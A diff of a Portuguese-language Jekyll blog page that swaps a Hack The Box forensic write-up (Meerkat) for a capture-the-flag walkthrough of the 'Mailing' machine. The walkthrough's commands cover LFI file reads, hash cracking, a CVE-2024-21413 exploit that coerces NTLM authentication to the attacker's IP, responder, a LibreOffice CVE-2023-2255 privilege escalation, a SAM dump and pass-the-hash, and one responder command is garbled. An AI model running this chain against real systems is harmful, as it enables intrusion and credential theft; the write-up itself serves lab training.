@@ -30,23 +30,23 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="HTB Sherlocks - Meerkat" />
+<meta property="og:title" content="HTB Máquinas - Mailing" />
 <meta property="og:locale" content="pt" />
-<meta name="description" content="Meerkat" />
-<meta property="og:description" content="Meerkat" />
-<link rel="canonical" href="http://localhost:4000/posts/HTB-Meerkat/" />
-<meta property="og:url" content="http://localhost:4000/posts/HTB-Meerkat/" />
+<meta name="description" content="Mailing" />
+<meta property="og:description" content="Mailing" />
+<link rel="canonical" href="http://localhost:4000/posts/HTB-Mailing/" />
+<meta property="og:url" content="http://localhost:4000/posts/HTB-Mailing/" />
 <meta property="og:site_name" content="Projekt Yoshiro" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2024-04-18T03:47:12-03:00" />
+<meta property="article:published_time" content="2024-05-06T04:50:12-03:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HTB Sherlocks - Meerkat" />
+<meta property="twitter:title" content="HTB Máquinas - Mailing" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-18T03:47:12-03:00","datePublished":"2024-04-18T03:47:12-03:00","description":"Meerkat","headline":"HTB Sherlocks - Meerkat","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HTB-Meerkat/"},"url":"http://localhost:4000/posts/HTB-Meerkat/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-06T04:50:12-03:00","datePublished":"2024-05-06T04:50:12-03:00","description":"Mailing","headline":"HTB Máquinas - Mailing","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HTB-Mailing/"},"url":"http://localhost:4000/posts/HTB-Mailing/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>HTB Sherlocks - Meerkat | Projekt Yoshiro
+  <title>HTB Máquinas - Mailing | Projekt Yoshiro
   </title>
 
   <!--
@@ -332,7 +332,7 @@
         
           
             
-              <span>HTB Sherlocks - Meerkat</span>
+              <span>HTB Máquinas - Mailing</span>
             
 
           
@@ -1037,6 +1037,69 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -1062,72 +1125,6 @@
       
         
         
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
       
 
       
@@ -1201,7 +1198,7 @@
 
 <article class="px-1">
   <header>
-    <h1 data-toc-skip>HTB Sherlocks - Meerkat</h1>
+    <h1 data-toc-skip>HTB Máquinas - Mailing</h1>
 
     <div class="post-meta text-muted">
       <!-- published date -->
@@ -1217,13 +1214,13 @@
 
 <time
   
-  data-ts="1713422832"
+  data-ts="1714981812"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Apr 18, 2024
+  May  6, 2024
 </time>
 
       </span>
@@ -1268,9 +1265,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="450 words"
+  title="614 words"
 >
-  <em>2 min</em> read</span>
+  <em>3 min</em> read</span>
 
       </div>
       <!-- .d-flex -->
@@ -1279,97 +1276,219 @@
   </header>
 
   <div class="content">
-    <h1 id="meerkat">Meerkat</h1>
+    <h1 id="mailing">Mailing</h1>
 
-<h2 id="task-1"><span class="me-2">Task 1</span><a href="#task-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?</em></p>
+<h2 id="enumeração"><span class="me-2">Enumeração</span><a href="#enumeração" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>Antes de tudo, é possível observar que o host local é o 172.31.6.44 e que, está recebendo muito tráfego vindo dos IP’s 54.144.148.213, 156.146.62.213, 138.199.59.221 e 95.181.232.30.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre></td><td class="rouge-code"><pre>┌──(yoshiro㉿kali)-[~]
+└─$ nmap -sV -A 10.10.11.14    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 08:22 -03
+Nmap scan report for mailing.htb (10.10.11.14)
+Host is up (0.35s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+25/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mailing
+110/tcp open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER UIDL TOP
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp open  imap          hMailServer imapd
+|_imap-capabilities: ACL IMAP4rev1 CHILDREN IDLE NAMESPACE RIGHTS=texkA0001 CAPABILITY SORT completed IMAP4 OK QUOTA
+445/tcp open  microsoft-ds?
+465/tcp open  ssl/smtp      hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+587/tcp open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+993/tcp open  ssl/imap      hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
-<p>Aplicando um filtro de tcp para a porta 8080 e para o host local e foi possível perceber que o aplicativo em execução é o BonitaSoft por conta das solicitações GET e POST que foram apresentadas.</p>
+Host script results:
+| smb2-time: 
+|   date: 2024-05-06T11:23:15
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
 
-<p>R: BonitaSoft
-<a href="https://i.imgur.com/qTru7jF.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/qTru7jF.png" alt="" loading="lazy"></a></p>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.23 seconds
+</pre></td></tr></tbody></table></code></div></div>
 
-<h2 id="task-2"><span class="me-2">Task 2</span><a href="#task-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Acreditamos que o invasor pode ter usado um subconjunto da categoria de ataque de força bruta – qual é o nome do ataque realizado?</em></p>
+<p>É possível identificar que o servidor está rodando Microsoft-IIS/10. E esse servidor é vulneravel a ataques LFI.</p>
 
-<p>Análisando as solicitações POST que foram realizadas no host, é possível perceber que o atacante está utilizando um método de força bruta baseado em injeção de credenciais.</p>
+<p><a href="https://i.imgur.com/NpRHvzW.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/NpRHvzW.png" alt="" loading="lazy"></a></p>
 
-<p>R: Credential Stuffing</p>
+<h2 id="explorando-a-vulnerabildade"><span class="me-2">Explorando a vulnerabildade</span><a href="#explorando-a-vulnerabildade" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p><a href="https://i.imgur.com/xtNGrYp.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/xtNGrYp.png" alt="" loading="lazy"></a></p>
+<p>Indo até ../../Program+Files+(x86)/hMailServer/Logs/hmailserver_awstats.log é possível vizualizar usuários cadastrados.</p>
 
-<h2 id="task-3"><span class="me-2">Task 3</span><a href="#task-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>A vulnerabilidade explorada possui um CVE atribuído? Se sim, qual?</em></p>
+<p><a href="https://i.imgur.com/cWfgezF.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/cWfgezF.png" alt="" loading="lazy"></a></p>
 
-<p>Analisando o JSON é possível identificar que o atacante utilizou o CVE-2022-25237 para tentar conseguir acesso a aplicação com uma exploit provido do bonitasoft.</p>
+<p>Indo até ../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI é possível identificar uma hash de senha.</p>
 
-<p>R: CVE-2022-25237</p>
+<p><a href="https://i.imgur.com/EWMNmkB.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/EWMNmkB.png" alt="" loading="lazy"></a></p>
 
-<p><a href="https://i.imgur.com/wZxr9Vk.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/wZxr9Vk.png" alt="" loading="lazy"></a></p>
+<h2 id="user-flag"><span class="me-2">User flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<h2 id="task-4"><span class="me-2">Task 4</span><a href="#task-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Qual string foi anexada ao caminho do URL da API para ignorar o filtro de autorização da exploração do invasor?</em></p>
+<p>Essa Hash se trata de uma MD5. Quebrando-a:</p>
 
-<p>Lendo sobre a vulnerabilidadae <a href="https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/">CVE-2022-25237</a>, é possível identificar que ela funciona adicionando “i18ntranslation” em uma das duas variações da URL.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>┌──(yoshiro㉿kali)-[~/htb]
+└─$ hashcat -m 0 -a 0 hash.txt rockyou.txt 
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/H9j8gHV.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/H9j8gHV.png" alt="" loading="lazy"></a></p>
 
-<p>R: i18ntranslation</p>
+<p>Com esse login, é possível acessar o telnet.</p>
 
-<p><a href="https://rhinosecuritylabs.com/wp-content/uploads/2022/05/1.png" class="popup img-link  shimmer"><img src="https://rhinosecuritylabs.com/wp-content/uploads/2022/05/1.png" alt="" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/uyISYhF.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/uyISYhF.png" alt="" loading="lazy"></a></p>
 
-<h2 id="task-5"><span class="me-2">Task 5</span><a href="#task-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Quantas combinações de nomes de usuário e senhas foram usadas no ataque de preenchimento de credenciais?</em></p>
+<p>Pesquisando novamente encontrei esse exploit: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file</p>
 
-<p>Apliquei o filtro http.request.method == “POST” e analisei quantas requisições únicas foram feitas.</p>
+<p>Esse exploit permite enviar um e-mail para a Maya para capturar a senha do NTLM.</p>
 
-<p>R: 56</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.51\mailing' --subject Yoshi
+</pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="https://i.imgur.com/IgA2VIM.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/IgA2VIM.png" alt="" loading="lazy"></a></p>
+<p>Utilize o responder para capturar o e-mail enviado para a Maya.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sudo responder -I tun0 -vudo responder -I tun0 -v
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/iHpNrkX.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/iHpNrkX.png" alt="" loading="lazy"></a></p>
 
-<h2 id="task-6"><span class="me-2">Task 6</span><a href="#task-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Qual combinação de nome de usuário e senha foi bem-sucedida?</em>
-Análisando a última requisição do filtro aplicado anteriormente, foi possível identificar o usuário e senha.</p>
+<p>Quebrando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>hashcat -m 5600 hash.txt rockyou.txt 
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/2z5u2bf.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/2z5u2bf.png" alt="" loading="lazy"></a></p>
 
-<p>R: seb.broom@forela.co.uk:g0vernm3nt</p>
+<p>Utilizando o login da maya, é possível acessar a máquina via evil-winrm e conseguir a user flag.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/YfXYxzu.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/YfXYxzu.png" alt="" loading="lazy"></a></p>
 
-<p><a href="https://i.imgur.com/itHdrlF.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/itHdrlF.png" alt="" loading="lazy"></a></p>
+<h2 id="root-flag"><span class="me-2">Root flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<h2 id="task-7"><span class="me-2">Task 7</span><a href="#task-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Se houver, qual site de compartilhamento de texto o invasor utilizou?</em></p>
+<p>Utilizei o CVE-2023-2255 que explora uma vulnerabilidade no LibreOffice para dar permissões a maya de administrador local.
+https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file</p>
 
-<p>Análisando o pacote 3652 com o método GET, foi possível identificar que o atacante utilizou o pastes.io.</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://i.imgur.com/ywnGvrv.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/ywnGvrv.png" alt="" loading="lazy"></a></p>
 
-<p>R: pastes.io</p>
+<p>Utilizando o crackmapexec que permite executar comandos remotos diretamente ao sistema operacional.</p>
 
-<p><a href="https://i.imgur.com/3Kw5Fkc.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/3Kw5Fkc.png" alt="" loading="lazy"></a></p>
+<p>Utilizando o –sam, o crackmapexec fará um dump no banco de dados SAM. Esse banco armazena credenciais dos usuários em um sistema windows.</p>
 
-<h2 id="task-8"><span class="me-2">Task 8</span><a href="#task-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Forneça o nome do arquivo da chave pública usada pelo invasor para obter persistência em nosso host.</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
+</pre></td></tr></tbody></table></code></div></div>
 
-<p>Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo é hffgra4unv.</p>
+<p><a href="https://i.imgur.com/Wvn2b1v.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/Wvn2b1v.png" alt="" loading="lazy"></a></p>
 
-<p>R: hffgra4unv</p>
+<p>Utilizando a hash que o crackmapexec forneceu, é possível acessar via impacket-wmiexec.</p>
 
-<p><a href="https://i.imgur.com/mQZAfIg.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/mQZAfIg.png" alt="" loading="lazy"></a></p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>impacket-wmiexec localadmin@10.10.11.14 -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae
+</pre></td></tr></tbody></table></code></div></div>
+<p>Dessa forma, é possível conseguir a root flag.</p>
 
-<h2 id="task-9"><span class="me-2">Task 9</span><a href="#task-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Você pode confirmar o arquivo modificado pelo invasor para ganhar persistência?</em></p>
-
-<p>Análisandoo script Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo modificado pelo atacante é /home/ubuntu/.ssh/authorized_keys.</p>
-
-<p>R: /home/ubuntu/.ssh/authorized_keys</p>
-
-<p><a href="https://i.imgur.com/mQZAfIg.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/mQZAfIg.png" alt="" loading="lazy"></a></p>
-
-<h2 id="task-10"><span class="me-2">Task 10</span><a href="#task-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><em>Você pode confirmar o ID da técnica MITRE deste tipo de mecanismo de persistência?</em></p>
-
-<p>Anaĺisando a Matrix do MITRE ATT&amp;CK, identifiquei um TTP que corresponde às ações do invasor: Chaves autorizadas SSH (T1098.004) em Manipulação de conta na coluna Persistência.</p>
-
-<p>R: T1098.004</p>
-
-<p><a href="https://i.imgur.com/GZt6qHu.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/GZt6qHu.png" alt="" loading="lazy"></a></p>
+<p><a href="https://i.imgur.com/3FOXYaW.png" class="popup img-link  shimmer"><img src="https://i.imgur.com/3FOXYaW.png" alt="" loading="lazy"></a></p>
 
   </div>
 
@@ -1380,7 +1499,7 @@ Análisando a última requisição do filtro aplicado anteriormente, foi possív
         <i class="far fa-folder-open fa-fw me-1"></i>
         
           <a href="/categories/htb/">HTB</a>,
-          <a href="/categories/sherlocks/">Sherlocks</a>
+          <a href="/categories/m%C3%A1quinas/">Máquinas</a>
       </div>
     
 
@@ -1390,9 +1509,9 @@ Análisando a última requisição do filtro aplicado anteriormente, foi possív
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/sherlocks/"
+            href="/tags/m%C3%A1quinas/"
             class="post-tag no-text-decoration"
-          >sherlocks</a>
+          >máquinas</a>
         
           <a
             href="/tags/htb/"
@@ -1433,28 +1552,28 @@ Análisando a última requisição do filtro aplicado anteriormente, foi possív
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HTB%20Sherlocks%20-%20Meerkat%20-%20Projekt%20Yoshiro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Meerkat%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=HTB%20M%C3%A1quinas%20-%20Mailing%20-%20Projekt%20Yoshiro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Mailing%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Sherlocks%20-%20Meerkat%20-%20Projekt%20Yoshiro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Meerkat%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20M%C3%A1quinas%20-%20Mailing%20-%20Projekt%20Yoshiro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Mailing%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Meerkat%2F&text=HTB%20Sherlocks%20-%20Meerkat%20-%20Projekt%20Yoshiro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Mailing%2F&text=HTB%20M%C3%A1quinas%20-%20Mailing%20-%20Projekt%20Yoshiro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
 
       
 
-      <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Meerkat%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
+      <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTB-Mailing%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
         <i class="fa-fw fab fa-linkedin"></i>
       </a>
     
@@ -1671,43 +1790,43 @@ Análisando a última requisição do filtro aplicado anteriormente, foi possív
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
   
 
   
@@ -1862,29 +1981,10 @@ Primeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para
 
 Enumeração
 Nmap:
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
 ──(yoshiro㉿kali)-[~/htb/runner]
 └─$ nmap 10.10.11.13 -A -sV -sC
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 ...
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03
+Nmap scan report for runner.htb (10.10.11...
                 </p>
               </div>
             </div>
@@ -1906,22 +2006,18 @@ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 ...
 
   
     <a
-      href="/posts/HTB-Devvortex/"
+      href="/posts/HTB-Intuition/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>HTB Máquinas - Devvortex</p>
+      <p>HTB Máquinas - Intuition</p>
     </a>
   
 
   
-    <a
-      href="/posts/HTB-Runner/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>HTB Máquinas - Runner</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
